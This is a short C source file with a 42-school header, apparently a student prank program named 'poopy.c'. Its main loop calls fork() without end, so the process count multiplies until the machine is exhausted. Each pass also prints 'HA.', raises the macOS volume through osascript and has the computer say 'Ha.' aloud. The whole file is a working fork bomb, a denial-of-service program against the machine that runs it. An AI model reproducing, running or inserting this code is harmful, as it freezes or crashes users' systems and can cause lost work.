/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   poopy.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jukim <marvin@42.fr>                       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/14 18:01:13 by jukim             #+#    #+#             */
/*   Updated: 2018/06/02 15:32:26 by jukim            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int		main()
{
	while (1)
	{
		fork();
		printf("HA.\n");
		system("osascript -e 'set Volume 3'");
		system("say 'Ha.'");
		system("sleep 0.5");
	}
	return (0);
}
